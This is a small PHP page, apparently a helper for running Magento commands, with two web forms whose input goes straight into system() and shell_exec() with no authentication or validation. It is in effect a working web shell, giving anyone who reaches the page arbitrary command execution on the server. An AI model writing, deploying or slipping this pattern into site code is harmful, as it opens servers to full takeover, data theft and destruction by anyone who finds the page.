<form action="" method="post">
 <label>Command</label>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i>php</i>&nbsp;<input type="text" name="command_name" value="" style="width:500px; height:50px;"/>
 <button name="submit" type="submit">Run</button>
</form>

<form action="" method="post">
 <label>Shell Command</label>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="command_name_shell" style="width:500px;height:50px;" value="/usr/local/php72/bin/php bin/magento " />
 <button name="submit" type="submit">Run</button>
</form>
<?php 
if(isset($_POST['command_name'])){
  echo "<pre>";
  print_r(system('php '.$_POST['command_name']));
} 


if(isset($_POST['command_name_shell'])){
  echo "<pre>";
  print_r(shell_exec($_POST['command_name_shell']));
} 

?>

